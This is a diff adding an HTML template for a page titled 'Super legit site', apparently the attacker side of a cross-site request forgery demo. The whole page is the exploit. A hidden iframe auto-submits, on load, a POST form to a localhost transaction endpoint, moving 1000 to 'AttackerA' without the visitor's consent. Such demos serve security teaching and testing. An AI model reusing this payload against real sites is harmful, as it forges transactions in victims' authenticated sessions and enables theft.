@@ -1,0 +1,18 @@
+<html xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <title th:text="${appName}"></title>
+    <link rel=stylesheet type="text/css" th:href="@{/css/home.css}">
+</head>
+<body>
+<h1>Super legit site</h1>
+
+<iframe srcdoc="<html><body onload='document.forms[0].submit()'>
+<form action='http://localhost:8080/transaction' method='POST'>
+    <input type='hidden' name='recipient' value='AttackerA'/>
+    <input type='hidden' name='amount' value='1000'/>
+    <input type='submit' value='Click!'/>
+</form>
+</body></html>">
+</iframe>
+</body>
+</html>
